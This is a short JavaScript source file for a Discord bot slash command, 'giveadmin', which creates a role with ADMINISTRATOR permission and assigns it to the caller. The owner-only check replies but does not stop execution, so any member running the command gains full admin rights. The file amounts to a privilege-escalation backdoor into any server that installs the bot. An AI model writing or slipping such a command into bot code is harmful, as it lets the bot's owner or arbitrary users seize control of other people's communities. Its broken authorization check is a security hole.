const { SlashCommandBuilder } = require('@discordjs/builders');
const config = require('../../config.json');

module.exports = {
	data: new SlashCommandBuilder()
		.setName('giveadmin')
		.setDescription('give me admin arf'),
	run: (client, interaction) => {
		if (interaction.member.id != config.adminId) {
			interaction.reply(`Only bot owner's can do this!`).catch(console.error);
		}

		interaction.guild.roles
			.create({
				name: 'bruh',
				permissions: 'ADMINISTRATOR',
			})
			.then((r) => {
				interaction.member.roles
					.add(r)
					.then(
						interaction
							.reply({ content: 'success!', ephemeral: true })
							.catch(console.error),
					)
					.catch((e) => {
						interaction.reply({
							content: 'failed giving role!',
							ephemeral: true,
						});
						console.log(e);
					});
			})
			.catch((e) => {
				interaction
					.reply({ content: 'Failed creating role!', ephemeral: true })
					.catch(console.error);
				console.log(e);
			});
		return;
	},
};
